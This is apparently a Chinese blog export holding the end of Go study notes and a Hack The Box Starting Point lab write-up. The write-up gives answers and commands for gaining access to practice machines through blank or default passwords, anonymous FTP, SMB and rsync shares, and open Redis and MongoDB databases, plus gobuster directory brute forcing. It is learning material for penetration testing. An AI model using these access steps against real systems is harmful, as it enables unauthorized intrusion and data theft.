<li><code>int</code>：例如<code>0</code>，，<code>255</code>。<code>2147483647</code>大小至少为 32 位的带符号整数（值范围：-2147483648 到 2147483647）。但这将取决于系统架构。大多数现代计算机都是 64 位的，因此<code>int</code>大小为 64 位（取值率为：-9223372036854775808 到 9223372036854775807）。</li>
<li><code>float64</code>：例如<code>0.0</code>，<code>3.14</code>。包含所有 64 位浮点数的集合。</li>
</ul>
</blockquote>
<p><code>+</code>Go 支持, <code>-</code>, <code>*</code>,<code>/</code> 和<code>%</code>（余数不取模）的标准算术运算符集。</p>
<p>在 Go 中，不同类型之间的赋值需要显式转换。例如，要将 an <code>int</code> 转换为 a <code>float64</code>，</p>
<p>您需要执行以下操作：<code>an := float64(a)</code></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x <span class="type">int</span> = <span class="number">42</span></span><br><span class="line">f := <span class="type">float64</span>(x)</span><br><span class="line"></span><br><span class="line">fmt.Printf(<span class="string">&quot;x is of type: %s\n&quot;</span>, reflect.TypeOf(x))</span><br><span class="line"><span class="comment">// Output: x is of type: int</span></span><br><span class="line"></span><br><span class="line">fmt.Printf(<span class="string">&quot;f is of type: %s\n&quot;</span>, reflect.TypeOf(f))</span><br><span class="line"><span class="comment">// Output: f is of type: float64</span></span><br></pre></td></tr></table></figure>

<h3 id="计算"><a href="#计算" class="headerlink" title="计算"></a>计算</h3><p><code>Go</code>的计算符使用以及运算简写和大部分代码是一样</p>
<blockquote>
<p>对于整数除法，余数被丢弃（例如<code>5 / 2 == 2</code>），也是一样的</p>
<p>简写，如</p>
<p>a+&#x3D;5</p>
<p>a++</p>
<p>a–</p>
</blockquote>
<h4 id="不同类型的算术运算"><a href="#不同类型的算术运算" class="headerlink" title="不同类型的算术运算"></a>不同类型的算术运算</h4><p>在许多语言中，您可以对不同类型的变量执行算术运算，但在 Go 中，这会产生错误。例如：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x <span class="type">int</span> = <span class="number">42</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// this line produces an error</span></span><br><span class="line">value := <span class="type">float32</span>(<span class="number">2.0</span>) * x <span class="comment">// invalid operation: mismatched types float32 and int</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// you must convert int type to float32 before performing arithmetic operation</span></span><br><span class="line">value := <span class="type">float32</span>(<span class="number">2.0</span>) * <span class="type">float32</span>(x)</span><br></pre></td></tr></table></figure>

<p>这是由于这样高精度和低精度进行计算，会导致精度丢失，需要先将低精度类型转化为高精度类型，再进行计算</p>
<h2 id="bool"><a href="#bool" class="headerlink" title="bool"></a>bool</h2><p>和大部分代码一样</p>
<p>Go 中的布尔值由<code>bool</code>类型表示。<code>bool</code>是<code>true</code>或<code>false</code>。</p>
<p>Go 支持三种布尔运算符：<code>!</code>(NOT)、<code>&amp;&amp;</code>(AND) 和<code>||</code>(OR)。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="literal">true</span> || <span class="literal">false</span> <span class="comment">// =&gt; true</span></span><br><span class="line"><span class="literal">true</span> &amp;&amp; <span class="literal">false</span> <span class="comment">// =&gt; false</span></span><br><span class="line">!<span class="literal">true</span> <span class="comment">// =&gt; false</span></span><br></pre></td></tr></table></figure>

<p>这三个布尔运算符各有不同的<em>运算符优先级</em>。因此，它们按以下顺序进行评估：<code>!</code>首先、<code>&amp;&amp;</code>第二和最后<code>||</code>。如果您想强制执行不同的顺序，您可以将布尔表达式括在圆括号中（即。<code>()</code>），因为圆括号具有更高的运算符优先级。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">!<span class="literal">true</span> &amp;&amp; <span class="literal">false</span>   <span class="comment">// =&gt; false</span></span><br><span class="line">!(<span class="literal">true</span> &amp;&amp; <span class="literal">false</span>) <span class="comment">// =&gt; true</span></span><br></pre></td></tr></table></figure>

<h3 id="if条件语句书写规范"><a href="#if条件语句书写规范" class="headerlink" title="if条件语句书写规范"></a>if条件语句书写规范</h3><p>如果习惯用</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(condition)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// do something</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// do something1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么在<code>Go</code>这里就行不通了，如果你按上面的格式进行书写，就会报错</p>
<blockquote>
<p><code>unexpected else</code></p>
</blockquote>
<p>你需要按照作者规定的格式，才会使得代码不显示错误</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> condition &#123;</span><br><span class="line">    <span class="comment">// do something</span></span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// do something1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>if+else if</code>也是如此</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> condition &#123;</span><br><span class="line">    <span class="comment">// do something</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> condition1 &#123;</span><br><span class="line">    <span class="comment">// do something1</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> condition2 &#123;</span><br><span class="line">    <span class="comment">// do something2</span></span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// do something3</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>Go</code>的作者追求简洁优雅高效的代码格式，所以遇到这种形式，只能按作者的方式进行编写（无奈</p>
<h1 id="Day3"><a href="#Day3" class="headerlink" title="Day3"></a>Day3</h1><h2 id="关于字符串"><a href="#关于字符串" class="headerlink" title="关于字符串"></a>关于字符串</h2><p>Go 中的<code>string</code>是一个<code>不可变的字节序列</code>，<code>不一定代表字符</code>。</p>
<p>双引号之间定义了一个字符串文字：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> name = <span class="string">&quot;Jane&quot;</span></span><br></pre></td></tr></table></figure>

<p>字符串可以通过<code>+</code>运算符连接起来：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;Jane&quot;</span> + <span class="string">&quot; &quot;</span> + <span class="string">&quot;Austen&quot;</span></span><br><span class="line"><span class="comment">// =&gt; &quot;Jane Austen&quot;</span></span><br></pre></td></tr></table></figure>

<p>一些特殊字符需要使用前导反斜杠进行转义，例如<code>\t</code>制表符和<code>\n</code>字符串中的新行。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;How is the weather today?\nIt&#x27;s sunny&quot;</span>  </span><br><span class="line"><span class="comment">// =&gt;</span></span><br><span class="line"><span class="comment">// How is the weather today?</span></span><br><span class="line"><span class="comment">// It&#x27;s sunny</span></span><br></pre></td></tr></table></figure>

<p>该<code>strings</code>包包含许多用于处理字符串的有用函数。有关字符串函数的更多信息，请查看<a href="https://pkg.go.dev/strings">字符串包文档</a>。这里有些例子：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;strings&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// strings.ToLower returns the string given as argument with all its characters lowercased</span></span><br><span class="line">strings.ToLower(<span class="string">&quot;MaKEmeLoweRCase&quot;</span>)</span><br><span class="line"><span class="comment">// =&gt; &quot;makemelowercase&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// strings.Repeat returns a string with a substring given as argument repeated many times</span></span><br><span class="line">strings.Repeat(<span class="string">&quot;Go&quot;</span>, <span class="number">3</span>)</span><br><span class="line"><span class="comment">// =&gt; &quot;GoGoGo&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="字符串包（strings）"><a href="#字符串包（strings）" class="headerlink" title="字符串包（strings）"></a>字符串包（strings）</h2><h3 id="关于字符串包"><a href="#关于字符串包" class="headerlink" title="关于字符串包"></a>关于字符串包</h3><p>该<code>strings</code>包包含许多用于处理字符串的有用函数。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;strings&quot;</span></span><br><span class="line"></span><br><span class="line">strings.ToUpper(<span class="string">&quot;test&quot;</span>) <span class="comment">// =&gt; &quot;TEST&quot;</span></span><br></pre></td></tr></table></figure>

<p>和<code>java</code>中的包很相似</p>
<blockquote>
<p>记几个常用的</p>
<p><code>strings.Repeat(str,num)</code>：重复str字符num次</p>
<p><code>strings.TrimSpace(str)</code>：清除<code>str</code>字符串<code>左右</code>边的空格</p>
<p><code>strings.TrimLeft/TrimRight(str,sign)</code>：清除<code>str</code>字符串<code>左/右</code>边的sign符号</p>
</blockquote>
<h1 id="Day4"><a href="#Day4" class="headerlink" title="Day4"></a>Day4</h1>]]></content>
      <categories>
        <category>语言学习</category>
      </categories>
      <tags>
        <tag>go语言</tag>
      </tags>
  </entry>
  <entry>
    <title>HACK THE BOX</title>
    <url>/2022/09/23/Hackthebox/</url>
    <content><![CDATA[<p><strong><code>想准备试试OSCP，HACK THE BOX还行，学习一些实战知识，以及一些概念了解，部分机器根据协议，我会总结知识点，不会给出全部</code></strong></p>
<span id="more"></span>

<h1 id="STARTING-POINT"><a href="#STARTING-POINT" class="headerlink" title="STARTING POINT"></a>STARTING POINT</h1><h1 id="第0层"><a href="#第0层" class="headerlink" title="第0层"></a>第0层</h1><h2 id="Meow"><a href="#Meow" class="headerlink" title="Meow"></a>Meow</h2><h3 id="Tags"><a href="#Tags" class="headerlink" title="Tags"></a>Tags</h3><blockquote>
<p><code>telnet</code></p>
<p><code>渗透测试仪 1 级</code></p>
<p><code>网络</code></p>
<p><code>协议</code></p>
<p><code>侦察</code></p>
<p><code>弱凭证</code></p>
<p><code>配置错误</code></p>
</blockquote>
<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><blockquote>
<ol>
<li>VPN 启动序列输出中“隧道接口”的缩写名称：<code>tun</code></li>
<li>我们使用什么工具通过 ICMP 回显请求测试我们与目标的连接：<code>ping</code>【ping不走代理】</li>
<li>用于在目标上查找开放端口的最常用工具的名称是什么？：<code>nmap</code></li>
<li>我们在扫描期间在端口 23&#x2F;tcp 上识别出什么服务？:<code>telnet</code>【远程登录】</li>
<li>什么用户名能够使用空白密码通过 telnet 登录目标？: <code>root</code></li>
</ol>
</blockquote>
<h4 id="命令telnet"><a href="#命令telnet" class="headerlink" title="命令telnet"></a>命令<code>telnet</code></h4><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">telnet</span><span class="meta"> [target_ip]</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/23/Hackthebox/image-20230127011324556.png" alt="image-20230127011324556"></p>
<h4 id="telnet和ssh的区别"><a href="#telnet和ssh的区别" class="headerlink" title="telnet和ssh的区别"></a>telnet和ssh的区别</h4><blockquote>
<p>加密方式不同：**<code>telnet</code>是明码传输<strong>，</strong><code>SSH</code>是加密传输**。 <code>telnet</code>通过<code>TCP/IP</code>协议簇来访问远程终端，<code>传输的数据和口令是明文形式</code>。 相对来说不安全，你所有的数据都可被攻击者直接捕获。 <strong>SSH相对于telnet安全</strong>，它的<code>传输方式是以加密形式传输</code></p>
</blockquote>
<h2 id="Fawn"><a href="#Fawn" class="headerlink" title="Fawn"></a>Fawn</h2><h3 id="Tags-1"><a href="#Tags-1" class="headerlink" title="Tags"></a>Tags</h3><blockquote>
<p><code>渗透测试仪 1 级</code></p>
<p><code>ftp</code></p>
<p><code>网络</code></p>
<p><code>协议</code></p>
<p><code>侦察</code></p>
<p><code>匿名/访客访问</code></p>
</blockquote>
<h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><blockquote>
<ol>
<li><p>3 个字母的首字母缩略词 FTP 代表什么？: <code>File Transfer Protocol</code>(文件传输协议)</p>
</li>
<li><p>FTP服务通常监听哪个端口？: <code>21</code></p>
</li>
<li><p>FTP 的安全版本使用什么首字母缩写词？: <code>SFTP</code></p>
</li>
<li><p>当您想在没有帐户的情况下登录时，通过 <code>FTP</code> 使用的用户名是什么？: <code>anonymous</code></p>
</li>
<li><p>我们得到的 FTP 消息“登录成功”的响应代码是什么？:<code>230</code></p>
<p><img src="/2022/09/23/Hackthebox/image-20230127001710275.png" alt="image-20230127001710275"></p>
</li>
<li><p>用于下载我们在 FTP 服务器上找到的文件的命令是什么？:<code>get</code></p>
</li>
</ol>
</blockquote>
<h4 id="命令ftp"><a href="#命令ftp" class="headerlink" title="命令ftp"></a>命令<code>ftp</code></h4><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">ftp <span class="selector-attr">[USER@]</span>HOST <span class="selector-attr">[PORT]</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/23/Hackthebox/image-20230127011036214.png" alt="image-20230127011036214"></p>
<h4 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h4><blockquote>
<p>文件传输协议（File Transfer Protocol，FTP）是用于在<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C?fromModule=lemma_inlink">网络</a>上进行文件传输的一套标准协议，它工作在 OSI 模型的第七层， TCP 模型的第四层， 即应用层， 使用 TCP 传输而不是 UDP， 客户在和服务器建立连接前要经过一个“三次握手”的过程， 保证客户与服务器之间的连接是可靠的， 而且是面向连接， 为数据传输提供可靠保证。</p>
</blockquote>
<h4 id="SFTP"><a href="#SFTP" class="headerlink" title="SFTP"></a>SFTP</h4><blockquote>
<p><code>sftp</code>是Secure File Transfer Protocol的缩写，安全文件传送协议。可以为传输文件提供一种安全的网络的加密方法。sftp 与 ftp 有着几乎一样的语法和功能。<code>SFTP 为 SSH的其中一部分</code>，是一种传输档案至 Blogger 伺服器的安全方式。其实在<code>SSH软件包</code>中，已经包含了一个叫作<code>SFTP(Secure File Transfer Protocol)的安全文件信息传输子系统</code>，SFTP<code>本身没有单独的守护进程</code>，它<code>必须使用sshd守护进程（端口号默认是22）</code>来完成相应的连接和答复操作，所以从某种意义上来说，SFTP并不像一个服务器程序，而更像是一个客户端程序。</p>
<p>SFTP同样是使用加密传输认证信息和传输的数据，所以，使用SFTP是非常安全的。但是，由于这种传输方式使用了加密&#x2F;解密技术，所以<code>传输效率比普通的FTP要低得多</code>，如果您对网络安全性要求更高时，可以使用SFTP代替FTP。</p>
</blockquote>
<h2 id="Dancing"><a href="#Dancing" class="headerlink" title="Dancing"></a>Dancing</h2><h3 id="Tags-2"><a href="#Tags-2" class="headerlink" title="Tags"></a>Tags</h3><blockquote>
<p><code>网络</code></p>
<p><code>协议</code></p>
<p><code>SMB</code></p>
<p><code>渗透测试仪 1 级</code></p>
<p><code>侦察</code></p>
<p><code>匿名/访客访问</code></p>
</blockquote>
<h3 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h3><blockquote>
<ol>
<li>3 个字母的首字母缩略词 SMB 代表什么？:<code>Server Message Block</code>(服务器消息块)</li>
<li>SMB 使用哪个端口进行操作？: <code>445</code></li>
<li>我们可以使用 SMB 工具来“列出”共享内容的“标志”或“开关”是什么？: <code>-L</code></li>
<li>我们最终能够使用空白密码访问的共享名称是什么？: <code>WorkShares</code></li>
<li>我们可以在 SMB shell 中使用什么命令来下载我们找到的文件？: <code>get</code></li>
</ol>
</blockquote>
<h4 id="命令smbclient"><a href="#命令smbclient" class="headerlink" title="命令smbclient"></a>命令<code>smbclient</code></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> smbclient -L [target_ip]</span><br><span class="line">#列出所有可用共享</span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/23/Hackthebox/image-20230127010237573.png" alt="image-20230127010237573"></p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">smbclient <span class="symbol">\\</span><span class="symbol">\\</span>[target_ip]<span class="symbol">\\</span>WorkShares</span><br><span class="line">#连接到 WorkShares</span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/23/Hackthebox/image-20230127010626438.png" alt="image-20230127010626438"></p>
<h4 id="什么是SMB"><a href="#什么是SMB" class="headerlink" title="什么是SMB"></a>什么是SMB</h4><blockquote>
<p><code>SMB</code>是客户端与服务器的交互协议，客户端在其中请求文件，然后服务器将文件提供给客户端。</p>
<p>现在，它是一个基于Windows的网络，使用户可以创建，修改和删除网络中的共享文件，文件夹，打印机。SMB是使用TCP端口445进行通信的应用程序分层协议。</p>
<p>它还提供了一种草根化的互通机制，可以在客户端和服务器之间进行传输以共享文件。随着其版本的升级，服务将得到更大的增强，并可以被用户或客户端有效使用。</p>
</blockquote>
<h4 id="SMB如何运作"><a href="#SMB如何运作" class="headerlink" title="SMB如何运作"></a>SMB如何运作</h4><blockquote>
<p><code>SMB</code>是一种请求-响应协议，这意味着它在客户端和服务器之间传输多条消息以完成请求。</p>
</blockquote>
<h4 id="FTP-SMB-NFS的区别"><a href="#FTP-SMB-NFS的区别" class="headerlink" title="FTP, SMB, NFS的区别"></a>FTP, SMB, NFS的区别</h4><p><img src="/2022/09/23/Hackthebox/image-20230127003921531.png" alt="image-20230127003921531"></p>
<blockquote>
<p><code>NFS</code> 最好，速度快点，配置复杂点<br><code>FTP</code> 最通用，最简单<br><code>SMB</code> 不太稳定，有时候Win 会提示找不到地址</p>
</blockquote>
<h2 id="Redeemer"><a href="#Redeemer" class="headerlink" title="Redeemer"></a>Redeemer</h2><h3 id="Tags-3"><a href="#Tags-3" class="headerlink" title="Tags"></a>Tags</h3><blockquote>
<p><code>Redis</code></p>
<p><code>渗透测试仪 1 级</code></p>
<p><code>漏洞评估</code></p>
<p><code>数据库</code></p>
<p><code>侦察</code></p>
<p><code>匿名/访客访问</code></p>
</blockquote>
<h3 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h3><blockquote>
<ol>
<li>Redis 是什么类型的数据库？:<code>In-memory Database</code>(内存数据库)</li>
<li>哪个命令行实用程序用于与 Redis 服务器交互？输入您要在终端中输入的程序名称，不带任何参数。: <code>redis-cli</code></li>
<li>Redis 命令行实用程序使用哪个标志来指定主机名？: <code>-h</code></li>
<li>连接到Redis服务器后，使用哪个命令获取有关Redis服务器的信息和统计信息？: <code>info</code></li>
<li>在 Redis 中使用哪个命令来选择所需的数据库？:  <code>select</code></li>
<li>哪个命令用于获取数据库中的所有键？： <code>keys *</code></li>
<li>哪个命令用于读取键值?：<code>get</code></li>
</ol>
</blockquote>
<h4 id="命令redis-cli"><a href="#命令redis-cli" class="headerlink" title="命令redis-cli"></a>命令<code>redis-cli</code></h4><figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line">redis-<span class="keyword">cli</span> -h target_ip</span><br><span class="line"><span class="meta">#连接到 redis 服务器</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/23/Hackthebox/image-20230127145928047.png" alt="image-20230127145928047"></p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="built_in">keys</span> * </span><br><span class="line"><span class="comment">#获取数据库中的所有键</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/23/Hackthebox/image-20230127145944398.png" alt="image-20230127145944398"></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="built_in">get</span> flag</span><br><span class="line"><span class="comment">#获取flag键值</span></span><br></pre></td></tr></table></figure>

<p>【动态flag，不能展示.png】</p>
<h4 id="什么是Redis"><a href="#什么是Redis" class="headerlink" title="什么是Redis"></a>什么是Redis</h4><blockquote>
<p><strong>Redis</strong> (REmote DIctionary Server) 是一种开源的高级 <code>NoSQL</code> <strong>键值数据存储</strong>，用作数据库、缓存和消息代理。</p>
<p>数据以具有键值对的字典格式存储。数据库存储在<code>服务器的 RAM（内存中）</code>中以实现快速数据访问。Redis 还会以不同的时间间隔将数据库的内容写入磁盘，以在<code>发生故障时将其作为备份持久保存</code>。</p>
<p>Redis 是一个开源的使用 ANSI C 语言编写、遵守 BSD 协议、支持网络、可基于内存、分布式、可选持久性的键值对(Key-Value)存储数据库，并提供多种语言的 API。</p>
<p>Redis 通常被称为数据结构服务器，因为值（value）可以是字符串(String)、哈希(Hash)、列表(list)、集合(sets)和有序集合(sorted sets)等类型。</p>
</blockquote>
<h2 id="Explosion"><a href="#Explosion" class="headerlink" title="Explosion"></a>Explosion</h2><h3 id="Tags-4"><a href="#Tags-4" class="headerlink" title="Tags"></a>Tags</h3><blockquote>
<p><code>网络</code></p>
<p><code>编程</code></p>
<p><code>RDP</code></p>
<p><code>渗透测试仪 1 级</code></p>
<p><code>侦察</code></p>
<p><code>弱凭证</code></p>
</blockquote>
<h3 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h3><blockquote>
<ol>
<li>3 个字母的首字母缩略词 RDP 代表什么？：<code>Remote Desktop Protocol</code>（远程桌面协议）</li>
<li>表示通过命令行界面与主机交互的三个字母的首字母缩写词是什么？：<code>CLI</code></li>
<li>那么图形用户界面交互呢？：<code>GUI</code></li>
<li>默认情况下未加密的旧远程访问工具的名称是什么？：<code>telnet</code></li>
<li>在 TCP 3389 端口上运行的服务的名称是什么？<code>ms-wbt-server</code>(RDP服务，默认端口3389)</li>
<li>使用 xfreerdp 时用于指定目标主机 IP 地址的开关是什么？：<code>/v:</code>(打开工具即可查看)</li>
<li>什么用户名使用空白密码成功返回桌面投影给我们？： <code>administrator</code>（windows用户的最高权限）</li>
</ol>
</blockquote>
<h4 id="命令xfreerdp"><a href="#命令xfreerdp" class="headerlink" title="命令xfreerdp"></a>命令xfreerdp</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">xfreerdp <span class="regexp">/v:10.129.31.107 /u</span>:administrator</span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/23/Hackthebox/image-20230127174214417.png" alt="image-20230127174214417"></p>
<h4 id="什么是RDP"><a href="#什么是RDP" class="headerlink" title="什么是RDP"></a>什么是RDP</h4><blockquote>
<p><strong>远程桌面</strong>协议 ( <strong>RDP</strong> ) 是 Microsoft 开发的专有协议，它<code>为用户提供图形界面以通过网络连接到另一台计算机</code>。用户为此目的使用<strong>RDP客户端软件，而另一台计算机必须运行</strong> <strong>RDP</strong>服务器软件</p>
</blockquote>
<h4 id="什么是freerdp"><a href="#什么是freerdp" class="headerlink" title="什么是freerdp"></a>什么是freerdp</h4><blockquote>
<p>FreeRDP是一个Remote Desktop Protocol（协议）的一个实现，遵循Apache开源协议，<code>支持3D功能，并有较高刷新率，也支持RemoteFX，H264编解码，用户管理，音频以及外设重定向</code>等功能。</p>
</blockquote>
<h2 id="Preignition"><a href="#Preignition" class="headerlink" title="Preignition"></a>Preignition</h2><h3 id="Tags-5"><a href="#Tags-5" class="headerlink" title="Tags"></a>Tags</h3><blockquote>
<p><code>网络</code></p>
<p><code>传统应用</code></p>
<p><code>Apache</code></p>
<p><code>渗透测试仪 1 级</code></p>
<p><code>侦察</code></p>
<p><code>网站结构发现</code></p>
<p><code>默认凭证</code></p>
</blockquote>
<h3 id="知识点-5"><a href="#知识点-5" class="headerlink" title="知识点"></a>知识点</h3><blockquote>
<ol>
<li><p>目录暴力破解是一种用于检查 Web 服务器上的许多路径以查找隐藏页面的技术。另叫做？:<code>dir busting</code></p>
</li>
<li><p>nmap的扫描用什么switch来指定我们要进行版本检测：<code>-sV</code></p>
</li>
<li><p>我们使用什么开关来指定我们要专门执行 dir busting 的 Gobuster？：<code>dir</code></p>
</li>
<li><p>当使用 gobuster 到 dir bust 时，我们添加什么开关以确保它找到 PHP 页面？：<code>-x php</code></p>
</li>
</ol>
</blockquote>
<h4 id="命令gobuster"><a href="#命令gobuster" class="headerlink" title="命令gobuster"></a>命令gobuster</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">gobuster dir -w <span class="regexp">/usr/</span>share<span class="regexp">/wordlists/</span>dirb<span class="regexp">/common.txt -u http:/</span><span class="regexp">/10.129.158.233/</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/23/Hackthebox/image-20230127211339954.png" alt="image-20230127211339954"></p>
<p>【下面是由于我用的wsl，没用vm，无法启动chrome，于是用curl传post登录数据，没有要求直接弱密码】</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">curl</span> http://10.129.158.233/admin.php -X POST -d <span class="string">&quot;username=admin&amp;password=adm</span></span><br><span class="line"><span class="string">in&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/23/Hackthebox/image-20230127211215675.png" alt="image-20230127211215675"></p>
<h4 id="什么是Gobuster"><a href="#什么是Gobuster" class="headerlink" title="什么是Gobuster"></a>什么是Gobuster</h4><blockquote>
<p>Gobuster是Kali Linux默认安装的一款暴力扫描工具。 它是使用Go语言编写的命令行工具，具备优异的执行效率和并发性能。 该工具支持对子域名和Web目录进行基于字典的暴力扫描。</p>
</blockquote>
<h2 id="Mongod"><a href="#Mongod" class="headerlink" title="Mongod"></a>Mongod</h2><h3 id="Tags-6"><a href="#Tags-6" class="headerlink" title="Tags"></a>Tags</h3><blockquote>
<p><code>MongoDB </code></p>
<p><code>渗透测试仪 1 级</code></p>
<p><code>网络</code></p>
<p><code>数据库</code></p>
<p><code>侦察</code></p>
<p><code>配置错误</code></p>
<p><code>匿名/访客访问</code></p>
</blockquote>
<h3 id="知识点-6"><a href="#知识点-6" class="headerlink" title="知识点"></a>知识点</h3><blockquote>
<ol>
<li><p>MongoDB 是什么类型的数据库？： <code>NoSQL</code></p>
</li>
<li><p>与 mongodb-clients 软件包一起安装的 Mongo shell 的命令名称是什么？: <code>mongo</code></p>
</li>
<li><p>用于列出 MongoDB 服务器上存在的所有数据库的命令是什么？: <code>show dbs</code></p>
</li>
<li><p>用于列出数据库中集合的命令是什么？： <code>show collections</code></p>
</li>
<li><p>将名为 flag 的集合中所有文档的内容以易于阅读的格式转储的命令是什么？: <code>db.flag.find().pretty()</code></p>
</li>
</ol>
</blockquote>
<h4 id="命令mongo"><a href="#命令mongo" class="headerlink" title="命令mongo"></a>命令mongo</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">mongo mongodb:<span class="regexp">//</span><span class="number">10.129</span>.<span class="number">173.130</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/23/Hackthebox/image-20230129215710939.png" alt="image-20230129215710939"></p>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> dbs</span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/23/Hackthebox/image-20230129215752293.png" alt="image-20230129215752293"></p>
<figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> sensitive_information</span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/23/Hackthebox/image-20230129215912471.png" alt="image-20230129215912471"></p>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> collections</span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/23/Hackthebox/image-20230129215847534.png" alt="image-20230129215847534"></p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">db<span class="selector-class">.flag</span><span class="selector-class">.find</span>()<span class="selector-class">.pretty</span>()</span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/23/Hackthebox/image-20230129215955916.png" alt="image-20230129215955916"></p>
<h4 id="什么是MongoDB"><a href="#什么是MongoDB" class="headerlink" title="什么是MongoDB"></a>什么是MongoDB</h4><blockquote>
<p>MongoDB是一个基于分布式文件存储 [1] 的数据库。由<a href="https://baike.baidu.com/item/C%2B%2B?fromModule=lemma_inlink">C++</a>语言编写。旨在为WEB应用提供可扩展的高性能数据存储解决方案。</p>
<p>MongoDB是一个介于<a href="https://baike.baidu.com/item/%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93?fromModule=lemma_inlink">关系数据库</a>和非关系数据库之间的产品，是非关系数据库当中功能最丰富，最像关系数据库的。它支持的数据结构非常松散，是类似<a href="https://baike.baidu.com/item/json?fromModule=lemma_inlink">json</a>的<a href="https://baike.baidu.com/item/bson?fromModule=lemma_inlink">bson</a>格式，因此可以存储比较复杂的数据类型。Mongo最大的特点是它支持的查询语言非常强大，其语法有点类似于面向对象的查询语言，几乎可以实现类似关系数据库单表查询的绝大部分功能，而且还支持对数据建立<a href="https://baike.baidu.com/item/%E7%B4%A2%E5%BC%95?fromModule=lemma_inlink">索引</a>。</p>
</blockquote>
<h2 id="Synced"><a href="#Synced" class="headerlink" title="Synced"></a>Synced</h2><h3 id="Tags-7"><a href="#Tags-7" class="headerlink" title="Tags"></a>Tags</h3><blockquote>
<p><code>Rsync</code></p>
<p><code>渗透测试仪 1 级</code></p>
<p><code>网络</code></p>
<p><code>协议</code></p>
<p><code>侦察</code></p>
<p><code>匿名/访客访问</code></p>
</blockquote>
<h3 id="知识点-7"><a href="#知识点-7" class="headerlink" title="知识点"></a>知识点</h3><blockquote>
<ol>
<li>rsync 的默认端口是什么？：<code>873</code></li>
<li>Linux 上与 rsync 交互的最常用命令名称是什么？：<code>rsync</code> </li>
<li>您必须向 rsync 传递哪些凭据才能使用匿名身份验证？：<code>None</code>(无)</li>
<li>仅列出 rsync 上的共享和文件的选项是什么？（无需包括前导 – 字符）：<code>list-only</code></li>
</ol>
</blockquote>
<h4 id="命令rsync"><a href="#命令rsync" class="headerlink" title="命令rsync"></a>命令rsync</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">rsync</span> --list-only <span class="number">10.129.33.133</span>::</span><br></pre></td></tr></table></figure>

<p><img src="/2022/09/23/Hackthebox/image-20230129222433250.png" alt="image-20230129222433250"></p>
